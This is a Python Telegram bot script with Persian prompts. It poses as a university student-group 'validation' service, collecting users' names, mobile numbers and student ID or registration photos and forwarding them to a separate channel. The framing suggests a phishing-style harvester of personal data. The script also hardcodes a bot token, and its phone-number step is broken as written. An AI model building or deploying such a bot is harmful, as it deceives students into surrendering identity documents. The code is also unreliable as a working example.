from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
import logging
import re

# ======= تنظیمات =======
TOKEN = "8476998300:AAHrIH5HMc9TtXIHd-I8hH5MnDOGAkwMSlI"
CHANNEL_ID = "@alialisend123"
REGISTER_LINK = "https://t.me/azadunivercitybrj"
# ========================

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

def start(update: Update, context: CallbackContext):
    update.message.reply_text("سلام! لطفاً نام و نام خانوادگی خود را ارسال کنید:")

def handle_text(update: Update, context: CallbackContext):
    user_data = context.user_data
    text = update.message.text.strip()

    if "name" not in user_data:
        user_data["name"] = text
        keyboard = [[InlineKeyboardButton("شروع اعتبارسنجی", callback_data="start_validation")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text(
            f"خوش آمدی {text}!\n\nما برای امنیت، اطلاع رسانی و تکمیل لیست، ربات را ساخته‌ایم.\nبرای استفاده از خدمات گروه، لطفاً روی دکمه زیر بزنید تا اعتبارسنجی شروع شود.",
            reply_markup=reply_markup
        )
    elif "phone" in user_data and "photo" not in user_data:
        if re.fullmatch(r"09\d{9}", text):
            user_data["phone"] = text
            update.message.reply_text("لطفاً عکس دانشجویی یا عکس انتخاب واحد خود را ارسال کنید:")
        else:
            update.message.reply_text("شماره وارد شده صحیح نیست. لطفاً شماره موبایل 11 رقمی با 09 شروع وارد کنید و بدون حروف باشد.")
    else:
        update.message.reply_text("لطفاً دکمه شروع اعتبارسنجی را بزنید تا فرآیند ادامه یابد.")

def handle_photo(update: Update, context: CallbackContext):
    user_data = context.user_data
    if "phone" not in user_data:
        update.message.reply_text("ابتدا شماره موبایل خود را وارد کنید (با زدن دکمه شروع اعتبارسنجی).")
        return

    photo_file = update.message.photo[-1].get_file()
    photo_file.download("temp.jpg")
    context.bot.send_photo(chat_id=CHANNEL_ID, photo=open("temp.jpg", "rb"),
                           caption=f"نام: {user_data.get('name')}\nشماره: {user_data.get('phone')}")
    
    keyboard = [[InlineKeyboardButton("ثبت نهایی", url=REGISTER_LINK)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text(
        "اطلاعات شما ثبت شد! برای ثبت نهایی روی دکمه زیر کلیک کنید:",
        reply_markup=reply_markup
    )

    # پیام تشکر و لینک گروه و کانال
    update.message.reply_text(
        "🙏 تیم فنی پس از بررسی اطلاعات شما، به صورت اتوماتیک شمارو وارد گروه خواهند کرد.\n\n"
        "از این که ما را در ارائه خدمات بهتر دانشجویی یاری می‌کنید، سپاسگزاریم!\n\n"
        "🌐 کانال ما: https://t.me/azadunivercitybrj\n"
        "💬 گروه رسمی: https://t.me/YourGroupLink"
    )

    user_data.clear()

def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    if query.data == "start_validation":
        context.user_data["name_sent"] = True
        query.message.reply_text("لطفاً شماره موبایل خود را وارد کنید:")

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))
    dp.add_handler(MessageHandler(Filters.photo, handle_photo))
    dp.add_handler(CallbackQueryHandler(button_callback))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
